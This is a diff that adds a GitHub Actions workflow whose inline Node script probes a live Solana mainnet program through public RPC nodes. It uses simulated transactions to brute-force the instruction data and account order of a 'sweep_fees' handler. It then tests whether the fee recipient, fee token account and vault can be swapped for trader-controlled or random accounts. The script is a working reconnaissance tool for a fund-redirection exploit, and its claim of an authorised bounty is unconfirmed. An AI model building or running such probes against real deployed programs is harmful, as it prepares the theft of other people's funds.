@@ -1,0 +1,100 @@
+name: mayhem-sweep-layout-runtime
+on:
+  push:
+    branches: [audit/boost-runtime-probe-20260815]
+    paths: ['.github/workflows/mayhem-sweep-layout-runtime.yml']
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 24
+      - run: npm install --no-save @solana/web3.js @solana/spl-token
+      - name: Simulation-only greedy account recovery and redirect differential
+        shell: bash
+        run: |
+          node --input-type=module <<'NODE'
+          import {PublicKey,TransactionInstruction,TransactionMessage,VersionedTransaction} from '@solana/web3.js';
+          import {getAssociatedTokenAddressSync,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID,NATIVE_MINT} from '@solana/spl-token';
+          import crypto from 'node:crypto';
+          const pk=s=>new PublicKey(s);
+          const P=pk('MAyhSmzXzV1pTf7LsNkrNwkWKTo4ougAJ1PPg47MD4e');
+          const GLOBAL=pk('13ec7XdrjF3h3YcqBTFDSReRcUFwbCnJaAQspM4j6DDJ');
+          const ADMIN=pk('FFWtrEQ4B4PKQoVuHYzZq8FabGkVatYzDpEVHsK5rrhF');
+          const TRADER=pk('Gygj9QQby4j2jryqyqBHvLP7ctv2SaANgh4sCb69BUpA');
+          const RANDOM=pk('Ce6TQqeHC9p8KetsN6JsjHK7UTZk7nasjjnr7XxXp9F1');
+          const SYSTEM=pk('11111111111111111111111111111111');
+          const SOL_VAULT=pk('BwWK17cbHxwWBKZkUYvzxLcNQ1YVyaFezduWbtm2de6s');
+          const QUOTE=pk('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');
+          const FEE0=pk('GesfTA3X2arioaHp8bbKdjG9vJtskViWACZoYvxp4twS');
+          const FEE6=pk('463MEnMeGyJekNZFQSTUABBEbLnvMTALbT6ZmsxAbAdq');
+          const [EVENT]=PublicKey.findProgramAddressSync([Buffer.from('__event_authority')],P);
+          const VAULT_QUOTE=getAssociatedTokenAddressSync(QUOTE,SOL_VAULT,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);
+          const FEE0_ATA=getAssociatedTokenAddressSync(QUOTE,FEE0,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);
+          const FEE6_ATA=getAssociatedTokenAddressSync(QUOTE,FEE6,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);
+          const TRADER_ATA=getAssociatedTokenAddressSync(QUOTE,TRADER,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);
+          const ADMIN_ATA=getAssociatedTokenAddressSync(QUOTE,ADMIN,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);
+          console.log('DERIVED',JSON.stringify({event:EVENT.toBase58(),vaultQuote:VAULT_QUOTE.toBase58(),fee0Ata:FEE0_ATA.toBase58(),fee6Ata:FEE6_ATA.toBase58(),traderAta:TRADER_ATA.toBase58(),adminAta:ADMIN_ATA.toBase58()},null,2));
+          console.log('KNOWN_FEE0_ATA_MATCH',FEE0_ATA.toBase58()==='41xY1DU1zzo893bEg2HzTFxPVVM84UvDCNsQm6aKRq8Z');
+          const role={
+            admin:{pubkey:ADMIN,isSigner:true,isWritable:true}, payer:{pubkey:TRADER,isSigner:true,isWritable:true}, trader:{pubkey:TRADER,isSigner:true,isWritable:true},
+            system_program:{pubkey:SYSTEM,isSigner:false,isWritable:false}, global_params:{pubkey:GLOBAL,isSigner:false,isWritable:true}, global:{pubkey:GLOBAL,isSigner:false,isWritable:true},
+            event_authority:{pubkey:EVENT,isSigner:false,isWritable:false}, program:{pubkey:P,isSigner:false,isWritable:false}, sol_vault:{pubkey:SOL_VAULT,isSigner:false,isWritable:true},
+            quote_mint:{pubkey:QUOTE,isSigner:false,isWritable:false}, sol_vault_quote_ata:{pubkey:VAULT_QUOTE,isSigner:false,isWritable:true}, token_program:{pubkey:TOKEN_PROGRAM_ID,isSigner:false,isWritable:false},
+            associated_token_program:{pubkey:ASSOCIATED_TOKEN_PROGRAM_ID,isSigner:false,isWritable:false}, admin_quote_ata:{pubkey:ADMIN_ATA,isSigner:false,isWritable:true}, trader_quote_ata:{pubkey:TRADER_ATA,isSigner:false,isWritable:true},
+            wsol_mint:{pubkey:NATIVE_MINT,isSigner:false,isWritable:false}, fee_recipient:{pubkey:FEE0,isSigner:false,isWritable:true}, fee_recipient_ata:{pubkey:FEE0_ATA,isSigner:false,isWritable:true},
+            quote_token_program:{pubkey:TOKEN_PROGRAM_ID,isSigner:false,isWritable:false}
+          };
+          const RPCS=['https://rpc.solanatracker.io/public','https://api.mainnet-beta.solana.com','https://solana-rpc.publicnode.com'];let id=1;const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+          async function rpc(method,params){let last;for(const url of RPCS){try{const r=await fetch(url,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only-sweep-layout/1.0'},body:JSON.stringify({jsonrpc:'2.0',id:id++,method,params})});if(!r.ok)throw Error('HTTP '+r.status);const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));return {url,result:j.result}}catch(e){last=e;console.log('RPCFAIL',method,url,String(e).slice(0,160));await sleep(260)}}throw last}
+          const bh=(await rpc('getLatestBlockhash',[{commitment:'processed'}])).result.value.blockhash;
+          const disc=crypto.createHash('sha256').update('global:sweep_fees').digest().subarray(0,8);
+          const dataVars=[disc,Buffer.concat([disc,Buffer.from([0])]),Buffer.concat([disc,Buffer.alloc(2)]),Buffer.concat([disc,Buffer.alloc(4)]),Buffer.concat([disc,Buffer.alloc(8)]),Buffer.concat([disc,Buffer.from([0]),Buffer.alloc(8)]),Buffer.concat([disc,Buffer.alloc(16)])];
+          const placeholder=()=>({pubkey:SYSTEM,isSigner:false,isWritable:false});
+          function errInfo(v){const logs=v?.logs??[];const text=logs.join('\n');const m=text.match(/AnchorError caused by account: ([A-Za-z0-9_\-]+)/);const c=text.match(/Error Code: ([A-Za-z0-9_]+)/);const n=text.match(/Error Number: (\d+)/);return {account:m?.[1]??null,code:c?.[1]??null,num:n?.[1]?Number(n[1]):null,text,interesting:logs.filter(x=>/Instruction:|AnchorError|Error Code|Error Number|caused by account|Left:|Right:|failed|success|Sweep fee|Rate limit|Permission/.test(x)).slice(-25)}}
+          async function sim(keys,data,label,verbose=true){const ix=new TransactionInstruction({programId:P,keys,data});const msg=new TransactionMessage({payerKey:TRADER,recentBlockhash:bh,instructions:[ix]}).compileToV0Message();const tx=new VersionedTransaction(msg);const {url,result}=await rpc('simulateTransaction',[Buffer.from(tx.serialize()).toString('base64'),{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'processed'}]);const v=result?.value;const e=errInfo(v);if(verbose)console.log('SIM',label,JSON.stringify({rpc:url,err:v?.err??null,units:v?.unitsConsumed??null,account:e.account,code:e.code,num:e.num,interesting:e.interesting},null,2));await sleep(90);return {v,e}}
+          let chosen=null;
+          const baseKeys=Array.from({length:18},placeholder);
+          for(let i=0;i<dataVars.length;i++){const r=await sim(baseKeys,dataVars[i],'data_probe_'+i);if(r.e.code!=='InstructionDidNotDeserialize'){chosen=dataVars[i];console.log('DATA_CHOSEN',i,'len',chosen.length,'firstAccountError',r.e.account,'code',r.e.code);break}}
+          if(!chosen)throw Error('No data variant deserialized');
+          let keys=Array.from({length:18},placeholder),assigned=new Map(),lastSignature='';
+          for(let step=0;step<18;step++){
+            const base=await sim(keys,chosen,'map_step_'+step+'_base');
+            const sig=JSON.stringify({err:base.v?.err??null,account:base.e.account,code:base.e.code,num:base.e.num});
+            if(base.v?.err==null || (!base.e.account && base.e.code && !['AccountNotEnoughKeys','InstructionDidNotDeserialize'].includes(base.e.code)) || ['SweepFeeRateLimit','PermissionDenied','TradingPaused','WithdrawRateLimit'].includes(base.e.code)){
+              console.log('HANDLER_REACHED',step,JSON.stringify({err:base.v?.err??null,account:base.e.account,code:base.e.code,num:base.e.num}));break;
+            }
+            const want=base.e.account;
+            if(!want){console.log('NO_ACCOUNT_NAME_STOP',step,base.e.code,base.e.num);break}
+            const spec=role[want]; if(!spec){console.log('UNKNOWN_ROLE_STOP',want);break}
+            let found=-1;
+            for(let pos=0;pos<keys.length;pos++){
+              if(assigned.has(pos))continue;
+              const trial=keys.map(x=>({...x})); trial[pos]={...spec};
+              const r=await sim(trial,chosen,'try_'+want+'_at_'+pos,false);
+              const ns=JSON.stringify({err:r.v?.err??null,account:r.e.account,code:r.e.code,num:r.e.num});
+              if(ns!==sig && !(r.e.account===want && r.e.code===base.e.code && r.e.num===base.e.num)){
+                console.log('POSITION_PROGRESS',JSON.stringify({want,pos,before:{account:base.e.account,code:base.e.code,num:base.e.num},after:{err:r.v?.err??null,account:r.e.account,code:r.e.code,num:r.e.num,interesting:r.e.interesting}},null,2));
+                keys=trial;assigned.set(pos,want);found=pos;break;
+              }
+            }
+            if(found<0){console.log('POSITION_NOT_FOUND',want);break}
+          }
+          console.log('ASSIGNED',JSON.stringify([...assigned].map(([pos,name])=>({pos,name,pubkey:keys[pos].pubkey.toBase58(),signer:keys[pos].isSigner,writable:keys[pos].isWritable})),null,2));
+          const control=await sim(keys,chosen,'mapped_control');
+          const mutations=[];
+          const posByName=n=>[...assigned].find(([,x])=>x===n)?.[0];
+          function addMut(label,name,spec){const pos=posByName(name);if(pos===undefined){console.log('SKIP_MUTATION_NO_ROLE',label,name);return}const k=keys.map(x=>({...x}));k[pos]={...spec};mutations.push([label,k])}
+          addMut('sol_vault_to_random','sol_vault',{pubkey:RANDOM,isSigner:false,isWritable:true});
+          addMut('sol_vault_quote_ata_to_trader','sol_vault_quote_ata',{pubkey:TRADER_ATA,isSigner:false,isWritable:true});
+          addMut('fee_recipient_ata_to_trader','fee_recipient_ata',{pubkey:TRADER_ATA,isSigner:false,isWritable:true});
+          addMut('fee_recipient_to_other_keep_wrong_ata','fee_recipient',{pubkey:FEE6,isSigner:false,isWritable:true});
+          const frPos=posByName('fee_recipient'),faPos=posByName('fee_recipient_ata');if(frPos!==undefined&&faPos!==undefined){const k=keys.map(x=>({...x}));k[frPos]={pubkey:FEE6,isSigner:false,isWritable:true};k[faPos]={pubkey:FEE6_ATA,isSigner:false,isWritable:true};mutations.push(['fee_recipient_other_with_own_ata',k])}
+          addMut('trader_or_payer_to_random','trader',{pubkey:RANDOM,isSigner:true,isWritable:true});addMut('payer_to_random','payer',{pubkey:RANDOM,isSigner:true,isWritable:true});
+          for(const [label,k] of mutations)await sim(k,chosen,label);
+          console.log('FINAL_CONTROL',JSON.stringify({err:control.v?.err??null,account:control.e.account,code:control.e.code,num:control.e.num}));
+          NODE
